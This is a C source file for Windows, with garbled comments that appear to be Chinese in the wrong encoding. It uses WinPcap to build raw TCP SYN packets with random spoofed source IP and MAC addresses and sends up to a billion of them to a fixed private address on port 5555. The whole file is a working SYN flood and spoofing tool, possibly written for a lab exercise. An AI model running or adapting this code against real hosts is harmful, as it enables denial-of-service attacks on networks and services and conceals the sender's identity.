#define HAVE_REMOTE
#define _CRT_SECURE_NO_WARNINGS   //���ò���ȫ����
#pragma comment(lib, "wpcap.lib") //δ���ø����������ʱ��д�����
#pragma comment(lib, "ws2_32.lib")
#pragma  warning(disable:4996)//����ȡ���߽��������ʾ

#include <stdio.h>
#include "pcap.h"
#include<stdlib.h>
#include "Win32-Extensions.h"


struct Eth_header  //��14�ֽ�
{
	unsigned char   DstMac[6];//Ŀ��MAC��ַ 6�ֽ�
	unsigned char   SrcMac[6];//ԴMAC��ַ 6�ֽ�
	unsigned short  ProType;  //�����һ��ΪIPЭ�顣��ether_type��ֵ����0x0800  
}EthHeader;

struct Ip_Header  //��20�ֽڣ�����ѡ�
{
	unsigned char VerisonHeadlen;    //Version+IHL��ͷ����(��4bit,��1�ֽ�)     
	unsigned char ServerType;       //Server Type(1�ֽ�)       
	unsigned short TotalLength;         //Packet Length(2�ֽ�)��ͷ�����ݲ��ֵ��ܳ������ֽ�Ϊ��λ       
	unsigned short ident;         //Identification�ֶα�ʶ(2�ֽ�)
	unsigned short FlagOffset;    //flag��ʶλ(3bit)+Fragment Offset�ֶ�ƫ��(13bit)       
	unsigned char ttl;           //Time to Live��������(1�ֽ�),hopΪ��λ       
	unsigned char proto;         //protocol�ϲ�Э��λ(1�ֽ�)0x06->TCP,0x11->UDP,0x01->ICMP          
	unsigned short checksum;    //Header Checksum��ͷУ���(2�ֽ�)���ڼ���IP��ͷ�Ƿ�������ܼ������ݲ���
	unsigned long SrcIpAddress; //ԴIP(4�ֽ�)  
	unsigned long DstIpAddress; //Ŀ��IP(4�ֽ�)
	//Optionsѡ�4�ֽ��������������������Paddingsλ������0���룩
}IpHeader;

struct Tcp_Header  //20�ֽ�+����ѡ��
{
	unsigned short SrcPort;    //Դ�˿ڣ�2�ֽ�
	unsigned short DstPort;    //Ŀ�Ķ˿ڣ�2�ֽ�)
	unsigned long  SeqNum;     //Sequence Number���к�(4�ֽ�)
	unsigned long  AckNum;      //Acknowledgment numberȷ�Ϻ�(4�ֽ�)
	unsigned short HeadlenFlags; //Header Length(6bit)+Flags(10bit).Flag��������TCP������
	unsigned short WinSize;       //Window Size(2�ֽ�)
	unsigned short checksum;     //Tcp Checksum(2�ֽ�)
	unsigned short UrgPoi;        //Urgent pointer(2�ֽ�)����ʱ��0
	//Options��4�ֽ�Ϊ��λ��������0x01�����ĩβ����4�ֽ���0x01����.����ʱ�ɲ���
	unsigned long options[3];

}TcpHeader;

struct Psd_Header    //TCP/UDPαͷ�� ��14�ֽ�
{
	unsigned long  SrcIpAddress;    //ԴIP(4�ֽ�)  
	unsigned long  DstIpAddress;    //Ŀ��IP(4�ֽ�)
	unsigned char  PutZero;         //��0(1�ֽ�)  
	unsigned char  ProType;        //�Ĳ�Э������(1�ֽ�)
	unsigned short TcpLenth;       //TCP/UDP���ݰ��ĳ���(����TCP/UDP��ͷ�������ݰ������ĳ��� ��λ:�ֽ�)  
}PsdHeader;


USHORT checksum(USHORT *buffer, int size)//У��ͼ��㺯��
{
	unsigned long cksum = 0;
	while (size>1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR *)buffer;
	}
	//��32λ��ת����16
	while (cksum >> 16)
		cksum = (cksum >> 16) + (cksum & 0xffff);
	return (USHORT)(~cksum);
}

/*�������ݰ�*/
void gen_packet(unsigned char *buf,int n)
{
	
	
	//�����������·��
	EthHeader.DstMac[0] = 0x00;
	EthHeader.DstMac[1] = 0x0c;
	EthHeader.DstMac[2] = 0x29;
	EthHeader.DstMac[3] = 0x35;
	EthHeader.DstMac[4] = 0x2b;
	EthHeader.DstMac[5] = 0x1c;

	EthHeader.SrcMac[0] = 0x00;
	EthHeader.SrcMac[1] = 0x50;
	EthHeader.SrcMac[2] = 0x56;
	EthHeader.SrcMac[3] = rand() % 256;
	EthHeader.SrcMac[4] = rand() % 256;
	EthHeader.SrcMac[5] = rand() % 256;
	EthHeader.ProType = htons(0x0800);

	
	char src_ip[20] = { 0 };
	sprintf(src_ip, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);//�������ip
	//��������
	IpHeader.VerisonHeadlen = 0x45;
	IpHeader.ServerType = 0x00;
	IpHeader.TotalLength = htons(sizeof(IpHeader)+sizeof(TcpHeader));//���IPͷ���е��ܳ����֣�TCP������Ϊ�����ݲ���
	IpHeader.ident = htons(0x0001);
	IpHeader.FlagOffset = htons(0x4000);
	IpHeader.ttl = 0x40;
	IpHeader.proto = 0x06;
	IpHeader.checksum = htons(0x0000);
	IpHeader.SrcIpAddress = inet_addr(src_ip);
	IpHeader.DstIpAddress = htonl(0xc0a8c682);

	IpHeader.checksum = checksum((USHORT*)&IpHeader, sizeof(IpHeader));//IPУ��ͼ������checksum���������������ֽ�������������ת��


	//��䴫���
	TcpHeader.SrcPort = htons(1024+rand());
	TcpHeader.DstPort = htons(0x15b3);
	TcpHeader.SeqNum = htonl(0x00000001+rand());
	TcpHeader.AckNum = htonl(0x00000000);
	TcpHeader.HeadlenFlags = htons(0x8002);//0x02��ʾSYN��
	TcpHeader.WinSize = htons(0x2000);
	TcpHeader.checksum = 0x0000;//21bf
	TcpHeader.UrgPoi = htons(0x0000);
	TcpHeader.options[0] = htonl(0x020405b4);//MASS
	TcpHeader.options[1] = htonl(0x01030302);//Window Scale 0x01���ڼ��
	TcpHeader.options[2] = htonl(0x01010402);//��һ��0x01������Windows Scaleѡ������ֽڣ��ڶ������ڼ��

	//���αͷ��
	PsdHeader.SrcIpAddress = IpHeader.SrcIpAddress;
	PsdHeader.DstIpAddress = IpHeader.DstIpAddress;
	PsdHeader.PutZero = 0x00;
	PsdHeader.ProType = IpHeader.proto;
	PsdHeader.TcpLenth = htons(sizeof(TcpHeader));

	unsigned char *tem = (unsigned char *)malloc(sizeof(PsdHeader)+sizeof(TcpHeader));
	memcpy(tem, &PsdHeader, sizeof(PsdHeader));
	memcpy(tem + sizeof(PsdHeader), &TcpHeader, sizeof(TcpHeader));
	TcpHeader.checksum = checksum((USHORT*)tem, sizeof(PsdHeader)+sizeof(TcpHeader));//���㲢���TCPУ���

	free(tem);//�ͷ��м��ڴ�


	//ƴ�Ӹ������ݲ���������ʱ�Ĳ���buf
	memcpy(buf, &EthHeader, sizeof(EthHeader));
	memcpy(buf + sizeof(EthHeader), &IpHeader, sizeof(IpHeader));
	memcpy(buf + sizeof(EthHeader)+sizeof(IpHeader), &TcpHeader, sizeof(TcpHeader));


		


}


int main()
{
	pcap_if_t *alldevs;//���ڳ�������������ϸ��Ϣ�Ľṹ��
	pcap_if_t *d;
	int inum;
	int i = 0;
	pcap_t *adhandle;//�ṩ��һ���Ѵ�������������
	char errbuf[PCAP_ERRBUF_SIZE];//���淢������ʱ�Ĵ�����Ϣ
	int ret = -1;

	/* ��ȡ���������豸�б� */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/* ��ӡ�����豸�б� */
	for (d = alldevs; d != NULL; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	/*ѡ�������豸�ӿ�*/
	printf("Enter the interface number (1-%d):", i);
	scanf("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* �ͷ��豸�б� */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* ��ת��ѡ�е������� */
	for (d = alldevs, i = 0; i< inum - 1; d = d->next, i++);//dһ��ʼָ�������ͷ��,Ҫ��������ת

	/* ���豸 */
	if ((adhandle = pcap_open(d->name,          // �豸��                      
		65536,            // 65535��֤�ܲ���������·����ÿ�����ݰ���ȫ������
		PCAP_OPENFLAG_PROMISCUOUS,    // ����ģʽ
		1000,             // ��ȡ��ʱʱ��
		NULL,             // Զ�̻�����֤
		errbuf            // ���󻺳��
		)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);

		/* �ͷ��豸�б� */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/*��ѡ�е��豸�ӿ��Ϸ�������*/
	printf("\nsending on %s...\n", d->description);

	/* �������ݰ�*/
	
	int packetlen = sizeof(EthHeader)+sizeof(IpHeader)+sizeof(TcpHeader);
	unsigned char *buf = (unsigned char *)malloc(packetlen);//�������ݱ��ռ�
	memset(buf, 0x0, packetlen);//�����ݰ�ĩβ��0��


	for (int n = 0; n < 1000000000; n++)//����n����ͬ�İ�
	{
		gen_packet(buf,n); //������ɵ����ݰ�
		//��ʼ���ݰ�����	
		if ((ret = pcap_sendpacket(adhandle, buf, packetlen)) == -1)
		{
			printf("����ʧ��\n");
			free(buf);
			pcap_close(adhandle);
			pcap_freealldevs(alldevs);
			return -1;
		}

		Sleep(300);

	}






	/*�ͷ���Դ*/
	free(buf);
	pcap_close(adhandle);
	pcap_freealldevs(alldevs);

	return 0;
}

